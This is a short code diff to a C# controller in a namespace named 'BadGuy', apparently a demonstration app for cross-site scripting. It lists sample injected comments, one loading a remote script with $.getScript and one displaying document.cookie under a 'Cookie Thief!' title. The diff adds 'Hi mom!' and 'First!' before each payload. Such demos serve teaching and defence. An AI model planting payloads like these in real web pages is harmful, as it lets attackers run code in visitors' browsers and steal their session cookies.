@@ -34,13 +34,13 @@ namespace BadGuy.Controllers
                                        {
                                            Title = "Script Loading Example",
                                            Content =
-                                               @"<script>$.getScript('http://erkie.github.com/asteroids.min.js');</script>"
+                                               @"Hi mom! <script>$.getScript('http://erkie.github.com/asteroids.min.js');</script>"
                                        },
                                    new InjectionExample
                                        {
                                            Title = "Cookie Thief!",
                                            Content =
-                                               @"<script>alert('Sending the following cookie info to bad people:  ' + document.cookie);</script>"
+                                               @"First!<script>alert('Sending the following cookie info to bad people:  ' + document.cookie);</script>"
                                        },
                                    new InjectionExample
                                        {
